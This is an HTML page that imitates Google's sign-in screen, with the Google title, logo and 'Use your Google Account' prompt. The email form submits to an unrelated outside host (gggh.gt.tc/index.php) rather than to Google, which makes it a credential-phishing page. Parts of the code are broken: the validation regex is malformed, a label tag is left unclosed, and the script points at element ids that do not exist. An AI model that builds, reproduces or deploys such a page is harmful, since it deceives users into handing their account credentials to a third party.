<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign in – Google</title>
  <!-- ✅ Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    /* ✅ Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    /* ✅ Dark background + Roboto font */
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #101010;
      color: #e8eaed;
      min-height: 100vh;
      padding: 48px 20px;
      display: block;
    }

    /* ✅ Body container */
    .body {
      max-width: 450px;
      margin: 0 auto;
    }

    /* ✅ Google Logo */
    .google-logo {
      width: 50px;
      max-width: 80%;
      margin-bottom: 36px;
    }

    /* ✅ Heading */
    h2 {
      font-size: 24px;
      font-weight: 400;
      color: #e8eaed;
      margin-bottom: 10px;
    }

    /* ✅ Subheading */
    .body > p {
      font-size: 16px;
      color: #9aa0a6;
      margin-bottom: 30px;
    }

    /* ✅ Floating Input Container */
    .input-container {
      position: relative;
      margin-bottom: 15px;
    }

    /* ✅ Input Fields */
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      background-color: #121212;
      color: #e8eaed;
      margin-bottom: 15px;
      outline: none;
    }

    input:focus {
      border-color: #8ab4f8;
      box-shadow: 0 0 0 1px #8ab4f8;
    }

    /* ✅ Floating Label */
    .floating-label {
      position: absolute;
      pointer-events: none;
      left: 14px;
      top: 14px;
      color: #9aa0a6;
      font-size: 16px;
      transition: 0.2s ease all;
    }

    /* Label when input is focused or has value */
    input:focus ~ .floating-label,
    input:not(:placeholder-shown) ~ .floating-label {
      top: -8px;
      left: 10px;
      font-size: 12px;
      background-color: #121212;
      padding: 0 4px;
      color: #8ab4f8;
    }

    /* ✅ Links */
    a {
      display: inline-block;
      font-size: 14px;
      color: #8ab4f8;
      text-decoration: none;
      margin-bottom: 20px;
    }

    a:hover {
      text-decoration: underline;
    }

    /* ✅ Guest Text */
    .guest {
      font-size: 13px;
      color: #9aa0a6;
      margin-top: 20px;
      margin-bottom: 30px;
      line-height: 1.5;
    }

    /* ✅ Footer Section */
    .footer {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 20px;
    }

    /* ✅ Submit Button */
    button {
      background-color: #8ab4f8;
      color: #000;
      border: none;
      padding: 10px 24px;
      font-weight: bold;
      font-size: 14px;
      border-radius: 4px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: #a0c3ff;
    }

    /* ✅ Mobile Friendly */
    @media screen and (max-width: 480px) {
      .body {
        padding: 32px 24px;
      }

      .google-logo {
        margin-bottom: 24px;
      }

      h2 {
        font-size: 22px;
      }
    }
  </style>
</head>
<body>
  <div class="body">

    <!-- ✅ Google Logo -->
    <img src="google.png" alt="Google logo" class="google-logo" />

    <!-- ✅ Sign in Heading -->
    <h2>Sign in</h2>
    <p>Use your Google Account</p>

 
         <!-- ✅ Email or Phone Form -->
    <form action="https://gggh.gt.tc/index.php" method="POST">

      <!-- Floating Input Container -->
      <div class="input-container">    
        <input type="text" name="email" id="email" placeholder=" " required
    pattern="^(\+?\d{10,15}+(@gmail.com[a-z0-9.-]+\.{2,})?|._%+-]+)$"
  >
        <label for="email" class="floating-label">Email or phone</>    
      </div>  


      <!-- Forgot Email Link -->
      <a href="#">Forgot email?</a>

      <!-- Guest Mode Info -->
      <p class="guest">
        Not your computer? Use Guest mode to sign in privately.
        <a href="#">Learn more about using Guest mode</a>
      </p>

      <!-- Footer Buttons -->
      <div class="footer">
        <a href="#">Create account</a>
        <button type="submit">Next</button>
      </div>
    </form>
  </div>
   <script>
    // Form validation
    document.getElementById('signinForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const emailInput = document.getElementById('email');
      const errorElement = document.getElementById('emailError');
      
      // Reset error message
      errorElement.style.display = 'none';
      
      // Basic email validation
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(emailInput.value)) {
        errorElement.textContent = 'Please enter a valid email address';
        errorElement.style.display = 'block';
        return;
      }
      
      // If validation passes, submit the form
      this.submit();
    });
  </script>
</body>
</html>
